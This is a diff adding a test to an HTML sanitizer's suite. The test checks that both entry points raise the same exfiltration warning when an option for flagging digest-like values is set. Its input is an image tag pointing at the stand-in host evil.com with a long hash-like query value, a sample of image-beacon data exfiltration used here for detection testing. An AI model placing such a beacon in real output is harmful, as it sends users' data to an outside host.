@@ -100,6 +100,26 @@ describe("warning parity between sanitize() and sanitizeText()", () => {
     );
   });
 
+  it("both entry points honor flagDigestValues, and neither invents it", async () => {
+    // The root entry forwards the option through a second module, so it is the
+    // half that can silently drop it while the pipeline half keeps working.
+    const input = `<img src="https://evil.com/x?h=${"a".repeat(40)}">`;
+    const options = { exfilScan: true, flagDigestValues: true };
+    const root = await sanitize(input, options);
+    const pipeline = await sanitizeText(input, options);
+    assert.deepEqual(root.warnings, pipeline.warnings);
+    assert.deepEqual(root.notes, pipeline.notes);
+    assert.ok(root.warnings.some((w) => /image to evil\.com/.test(w)));
+    // Non-vacuity: the same input is silent at BOTH entries without the option,
+    // so the assertion above is the option working and not the URL firing on
+    // some other arm.
+    for (const quiet of [
+      await sanitize(input, { exfilScan: true }),
+      await sanitizeText(input, { exfilScan: true }),
+    ])
+      assert.deepEqual(quiet.warnings, []);
+  });
+
   it("covers each shared warning at least once, so none drifts unwatched", () => {
     // Ties the corpus to the strings: a warning that no case triggers is one
     // both entry points could reword apart while this file stays green.
